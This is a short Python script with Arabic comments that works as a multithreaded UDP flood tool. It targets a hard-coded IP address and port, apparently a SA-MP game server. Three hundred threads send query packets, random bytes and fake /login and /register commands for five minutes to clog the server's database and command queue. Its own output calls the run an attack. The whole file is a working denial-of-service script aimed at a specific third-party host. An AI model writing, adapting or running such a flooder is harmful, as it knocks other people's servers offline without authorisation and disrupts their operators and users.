import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING LOGIC & SQL-BOTTLENECK STRESSOR (Application Layer) ===
# =====================================================================

TARGET_IP = "94.23.168.153"  # IP الهدف
TARGET_PORT = 2343            # بورت اللعبة
DURATION = 300                 # مدة الاختبار بالثواني
THREADS_COUNT = 300           # عدد الخيوط لاستغلال Ryzen 9

def logic_attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + DURATION
    
    # محاكاة أوامر متطرفة وحزم بيانات تحاول إجبار السكربت على تنفيذ استعلامات SQL ثقيلة
    # أو إرسال مدخلات وهمية تربك معالجة الـ Dialogs والأوامر داخل مود الـ Pawn
    stress_payloads = [
        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'c',
        b'SAMP' + random._urandom(512),  # حزم تحاكي بيانات دخول/تسجيل متكررة
        b'/login ' + random._urandom(20), # محاكاة ضغط على أوامر الـ MySQL
        b'/register ' + random._urandom(20),
        b'/stats ' + random._urandom(10)
    ]
    
    while time.time() < end_time:
        try:
            payload = random.choice(stress_payloads)
            # إرسال الحزم المكثفة لإشغال طابور معالجة الأوامر في السكربت
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء هجوم استهداف المنطق البرمجي و قاعدة البيانات على: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] تفعيل {THREADS_COUNT} خيط لإغراق طابور الاستعلامات والأوامر...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=logic_attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت جلسة اختبار المنطق البرمجي.")

if __name__ == "__main__":
    main()
